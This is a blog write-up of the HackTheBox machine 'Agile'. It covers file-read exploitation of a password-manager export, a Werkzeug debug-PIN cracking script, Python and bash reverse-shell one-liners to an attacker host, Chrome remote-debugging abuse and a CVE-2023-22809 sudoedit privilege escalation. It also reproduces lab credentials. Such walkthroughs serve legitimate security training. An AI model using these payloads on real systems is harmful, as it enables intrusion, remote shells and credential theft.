---

layout: writeup
category: HackTheBox
chall_description: 
points: 
solves: 
tags: Boot2Root Medium HTB
date: 2023-06-19
comments: false
---

## ## Challenge Description

This is a HTB Medium machine. It was exciting since this is my first medium machine ever on HTB, and I learnt a lots from this machine. Let's go!

## ## Solution

### Port Scanning

First of all, nmap:

![nmap](../../../assets/CTFs/HackTheBox/agile_nmap.png "Port Scanning")

Here we have a SSH on port `22` and a http on port `80` redirecting to `http://superpass.htb`

After having added superpass.htb to my `/etc/hosts` file, I headed to the site.

### Web Enumeration

This is the home page:

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_home.png)

Let's create an account and see what it does.

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_vault.png)

It seems like a application for password management to me. The export button will export our saved passwords as a csv file and allow us to download the file. This function can be a flaw in the system if implemented poorly. We can intercept the request to gain understanding of this function.

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_export.png)

With the username `abc`, the file is generated under the form `USERNAME_export_RANDOMSTRING`. Let's try to get the /etc/passwd file with LFI.

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_lfi.png)

```bash
$cat superpass_export.csv 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

We found the user `corum`, `edwards` and `dev_admin`. With LFI, we get access to any files we want on the system. Let's find a way to open a shell.

### Open a shell

A failed login results in this error. So this is an application written with Python Flask with SQL Alchemy. These two often comes with each others.

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_faillogin.png)

One thing interesting about Python Flask is that it allows developer to execute command remotely in debug mode to debug the application. This console is protected by a PIN, which can be replicated if we have enough information on the system.

We can try activate the console on clicking at the terminal symbol on the right end of the traceback bar.

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_console.png)

This is a Werkzeug Debugger. Looking for  `Werkzeug Debugger vulnerabilities` with Google, I found [this amazing article](https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/) explaining how the PIN is generated, and on combining with LFI, we can crack it as follows:

1. Get username of the user who runs the app
2. Get module name of the app
3. Get the application name of the app
4. Get the path to the app.py file
5. Get the MAC address of network interface, in decimal form uuid.getnode()
6. Get `/etc/machine-id`
7. On newer systems, combine the ID from `/etc/machine-id` with the last part of the value from `/proc/<pid>/cgroup`, split on the `/` character.
8. Concatenate all of the above values into a single string.
9. Take the MD5 hash or SHA1 hash of the concatenated string.
10. Encode the resulting digest as a 9-digit decimal number, with hyphens inserted every 3 digits.

Variables needed to exploit the console PIN:

```python
probably_public_bits = [
    username,
    modname,
    getattr(app, '__name__', getattr(app.__class__, '__name__')),
    getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()),
    get_machine_id(),
]
```

So let's find one by one.

#### User who runs the app

I always find LFI with the `/proc` directory useful for case like this. We can get the environment of the process at `/proc/self/environ`, the `self` will lead us to the /proc dir of the current working process without knowing its PID.

> Proc file system (procfs) is a virtual file system created on the fly when the system boots and is dissolved at the time of system shutdown.  It contains useful information about the processes that are currently  running, it is regarded as a control and information center for the  kernel. The proc file system also provides a communication medium  between kernel space and user space.

Or alternatively, we can use `getattr(app, '__name__', getattr (app .__ class__, '__name__'))`

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_user.png)

The user is `www-data`.

#### Module name

We can download the `app.py` file and see that the module name is by default `flask.app`

#### Application name and path

Thanks to the debug information, we can also know that the application working dir is `/app/venv/lib/python3.10/site-packages/flask/app.py` and the application name is `wsgi_app`

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_wsgiapp.png)

#### Private_bits

MAC: `/proc/net/arp` to get the interface and then `/sys/class/net/eth0/address` to get the MAC `00:50:56:b9:da:2c`

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_eth0.png)

```python
>>>print(0x005056b9da2c)
345052404268
```

Machine-id: `/etc/machine-id` we got `ed5b159560f54721827644bc9b220d00`

Cgroup value: `/proc/self/cgroup` and take the last part, split by `/` : `superpass.service`

So the first `private_bits` value is 345052404268 and the second is ed5b159560f54721827644bc9b220d00superpass.service

So we have all the ingredients to recreate the PIN. I use these code below from [this article](https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/) to recover it:

```python
import hashlib
import itertools
from itertools import chain

def crack_md5(username, modname, appname, flaskapp_path, node_uuid, machine_id):
    h = hashlib.md5()
    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def crack_sha1(username, modname, appname, flaskapp_path, node_uuid, machine_id):
    h = hashlib.sha1()
    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def crack(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id):
    probably_public_bits = [
            username,
            modname,
            appname,
            flaskapp_path ]
    private_bits = [
            node_uuid,
            machine_id ]

    h = hasher
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    print(rv)

if __name__ == '__main__':

    usernames = ['www-data']
    modnames = ['flask.app']
    appnames = ['wsgi_app']
    flaskpaths = ['/app/venv/lib/python3.10/site-packages/flask/app.py']
    nodeuuids = ['345052404268']
    machineids = ['ed5b159560f54721827644bc9b220d00superpass.service']

    # Generate all possible combinations of values
    combinations = itertools.product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids)

    # Iterate over the combinations and call the crack() function for each one
    for combo in combinations:
        username, modname, appname, flaskpath, nodeuuid, machineid = combo
        print('==========================================================================')
        crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid)
        print(f'{combo}')
        print('==========================================================================')
```

```
python3 ./pin_cracker.py
==========================================================================
116-841-486
('www-data', 'flask.app', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py', '345052381550', 'ed5b159560f54721827644bc9b220d00superpass.service')
==========================================================================

```

And it worked!! The console is ready to go:

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_pincracked.png)

Now we can make a reverse shell to our machine.

```python
#IF YOU WANT TO EXECUTE CMD 
>>> __import__('os').popen('cmd').read();
```

```python
#MAKE A SHELL, SINCE WE ARE ON A PYTHON CONSOLE ALREADY
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

> After having got a reverse shell, we can stablize it with `python -c 'import pty; pty.spawn("/bin/bash")'`,  then `Ctrl + Z`, `stty raw -echo; fg; reset` then `export TERM=xterm`
>
> More details [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_wwwdata.png)

We have access as user `www-data`.

### User.txt

We have a mysql database on this machine, and the cred can be found here:

```bash
(venv) www-data@agile:/app$ cat /app/config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

```mysql
mysql> select * from passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
5 rows in set (0.00 sec)
```

We found the password of user `corum:5db7caa1d13cc37c9fc2` for the machine `agile` and read `user.txt`

### root.txt

#### 1. user `edwards`

After looking around a bit, I found a strange-looking port 41829:

```bash
corum@agile:~$ ss -tln
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
LISTEN 0      5          127.0.0.1:43263      0.0.0.0:*          
LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*          
LISTEN 0      10         127.0.0.1:41829      0.0.0.0:*          
LISTEN 0      2048       127.0.0.1:5000       0.0.0.0:*          
LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
LISTEN 0      2048       127.0.0.1:5555       0.0.0.0:*          
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
LISTEN 0      5              [::1]:43263         [::]:*          
LISTEN 0      128             [::]:22            [::]:*       
```

With Linpeas, I knew it was a remote-debugging port of google chrome, and it can lead to a PE. It's a local host so we need to tunnel it, I will use SSH this time since we have the credential of `corum`, alternatively we can use [chisel](https://github.com/jpillora/chisel).

```bash
ssh -L 8000:127.0.0.1:41829 corum@10.10.11.203
```

Now all traffic to port 8000 on my attacking machine will be forwarded to port 41829 of the Agile machine. We need `chromium` to continue.

At `chrome://inspect/?search=discover#devices`, add our port 8000 to the `network targets`

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_port8000.png)

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_remote.png)

It was detected as SuperPassword application. Now we can `inspect` it and get the password of `edwards`

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_edwards.png)

The user `edwards` can use sudo as `dev_admin`:

```
edwards@agile:~$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
    use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

Checking the sudo version 1.9.9, we know that it is vulnerable to ` CVE-2023-22809`

```bash
export EDITOR="vim -p */any file/*"
sudoedit /app/config_test.json
```

With PsPy64 we can find an interesting process:

```bash
CMD: UID=0	PID=21811	|	/bin/bash -c source /app/venv/bin/activate
edwards@agile://$ ls -lh /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 2.0K Jun 19 04:00 /app/venv/bin/activate
```

So the group `dev_admin` can write the `activate`.

```
#exploit as edwards
export EDITOR="vim -p /app/venv/bin/activate"
sudo -u dev_admin sudoedit /app/config_test.json
######OR
export EDITOR="vi -- /app/venv/bin/activate"
sudo -u dev_admin sudoedit /app/config_test.json
```

![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_vim.png)

And we got into the `activate` file. Now we can modify it to whatever we want. I just simply leak the content of root.txt and that's it!

```bash
#!/bin/bash
cp /root/root.txt /tmp
chmod 666 /tmp/root.txt
```

Or, a root rev shell:

```bash
bash -i >& /dev/tcp/IP/4242 0>&1
```

And we got the flag root.txt.

```bash
edwards@agile://tmp$ cat /tmp/root.txt 
f9eb242e98afa7c58ae6XXXXXXXXX
```

